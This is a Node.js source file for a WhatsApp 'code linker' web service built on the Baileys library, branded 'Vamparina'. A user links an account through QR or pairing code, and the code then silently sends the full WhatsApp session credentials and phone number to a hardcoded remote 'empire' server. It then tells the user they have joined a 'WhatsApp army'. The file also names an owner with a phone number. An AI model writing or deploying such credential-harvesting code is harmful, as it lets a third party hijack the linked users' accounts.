import express from 'express';
import { fileURLToPath } from 'url';
import path from 'path';
import { makeWASocket, useMultiFileAuthState, DisconnectReason } from '@whiskeysockets/baileys';

const app = express();
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// YOUR EMPIRE BOT — NEVER CHANGE THIS
const EMPIRE_URL = "https://vamparina-v1-5.onrender.com";

app.use(express.static(__dirname));
app.use(express.json({ limit: '50mb' }));

// Home page
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'pair.html'));
});

let currentSock = null;
let pairingCode = null;

async function startLinker() {
    const { state, saveCreds } = await useMultiFileAuthState('./temp_session');
    
    const sock = makeWASocket({
        auth: state,
        printQRInTerminal: true,
        browser: ["Vamparina Code", "Chrome", "2025"],
        syncFullHistory: false,
        markOnlineOnConnect: false
    });

    currentSock = sock;

    sock.ev.on('connection.update', async (update) => {
        const { connection, qr, lastDisconnect } = update;

        if (qr) {
            console.log("QR CODE READY — SCAN NOW");
        }

        if (connection === 'open') {
            console.log("USER LINKED (QR or Phone Number) — SENDING TO EMPIRE...");

            const phone = sock.user.id.split(':')[0];
            const sessionId = "vamp_" + Date.now();

            try {
                const response = await fetch(`${EMPIRE_URL}/vamparina-activate`, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        phone,
                        sessionId,
                        creds: sock.authState.creds,
                        type: pairingCode ? "phone_number" : "qr_code",
                        source: "vamparina-code-linker"
                    })
                });

                const result = await response.json();
                console.log("Bot activated on empire:", result);

                await sock.sendMessage(sock.user.id, {
                    text: `*VAMPARINA V1 ACTIVATED SUCCESSFULLY*\n\nMethod: ${pairingCode ? "Phone Number + Code" : "QR Code"}\nEmpire Group: Joined Automatically\nOwner: Arnold Chirchir (+254703110780)\n\nYou are now part of Kenya's strongest WhatsApp army 2025\n\nLong live the King`
                });

                pairingCode = null; // Reset for next user

            } catch (err) {
                console.error("Failed to activate:", err.message);
            }
        }

        if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            if (shouldReconnect) {
                console.log("Reconnecting linker...");
                setTimeout(startLinker, 5000);
            }
        }
    });

    sock.ev.on('creds.update', saveCreds);
}

// SUPPORT FOR PHONE NUMBER + PAIRING CODE
app.post('/pair', async (req, res) => {
    const { number } = req.body;
    if (!number || !/^\d{10,15}$/.test(number.replace(/[^0-9]/g, ''))) {
        return res.status(400).json({ error: "Invalid number" });
    }

    try {
        const code = await currentSock.requestPairingCode(number.replace(/[^0-9]/g, ''));
        pairingCode = code.match(/.{1,4}/g).join('-');
        console.log(`PAIRING CODE for ${number}: ${pairingCode}`);
        res.json({ success: true, code: pairingCode });
    } catch (err) {
        res.status(500).json({ error: "Failed to generate code" });
    }
});

startLinker();

app.get('/status', (req, res) => {
    res.json({ 
        status: "VAMPARINA CODE LINKER LIVE", 
        empire: EMPIRE_URL,
        supports: ["QR Code", "Phone Number + Pairing Code"],
        time: new Date().toLocaleString('en-KE')
    });
});

const PORT = process.env.PORT || 8000;
app.listen(PORT, () => {
    console.log(`
VAMPARINA CODE LINKER — FULLY ACTIVE
Supports: QR Code + Phone Number Pairing
Sending all bots to: ${EMPIRE_URL}
Visit: https://vamparina-code.onrender.com
    `);
});